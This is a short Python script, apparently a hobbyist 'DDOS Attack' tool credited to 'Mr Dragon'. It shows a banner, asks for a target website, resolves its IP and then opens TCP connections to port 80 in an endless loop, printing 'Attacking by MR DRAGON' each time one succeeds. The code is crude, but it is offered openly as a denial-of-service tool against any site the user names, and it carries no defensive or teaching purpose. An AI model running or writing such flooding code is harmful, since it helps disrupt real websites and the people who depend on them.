import os,sys,socket,time
def slowtype(t):
   for D in t+ "\n":
	   sys.stdout.write(D) 
	   sys.stdout.flush()
	   time.sleep(6/100)
os.system('clear')
print ("""\033[1;33m
     ██████╗  ██████╗ ███████╗ █████╗ ████████╗ █████╗  ██████╗██╗  ██╗
     ██╔══██╗██╔═══██╗██╔════╝██╔══██╗╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
     ██║  ██║██║   ██║███████╗███████║   ██║   ███████║██║     █████╔╝
     ██║  ██║██║   ██║╚════██║██╔══██║   ██║   ██╔══██║██║     ██╔═██╗
     ██████╔╝╚██████╔╝███████║██║  ██║   ██║   ██║  ██║╚██████╗██║  ██╗
     ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
""")
slowtype("\033[31mWelcom To DDOS Attack py Mr Dragon")
ip =input ("\033[33;1mEnter ip website : ")
try:
    Web_ip = socket.gethostbyname(ip)
except:
    print()
    print("URL Without (->( HTTP:// OR HTTPS:// )<-)")
    time.sleep(2)
    exit()
print()
print(f"-| Host: {ip} -|- IP: {Web_ip} |-")
print()
print("0-<___________-+-___________>-0")
print()
time.sleep(2)
def con():
    while True:
        try:
            sock=socket.socket(socket.AF_INET ,socket.SOCK_STREAM)
            conn = sock.connect_ex((ip,80))
            data = "[\033[32;1m√√√ ]Attacking by MR DRAGON: {} : Port: {}".format(ip,"80")
            if conn == 0:
                print(data)
            else:
                if conn != 0:
                    con()
        except KeyboardInterrupt:
            def ex():
                pause = input("Attack Is Stoped Do u want Continue? (Y , N): ")
                if pause == "Y" or pause == "y":
                    con()
                if pause == "N" or pause == "n":
                    exit()
                else:
                    ex()
            ex()
con()
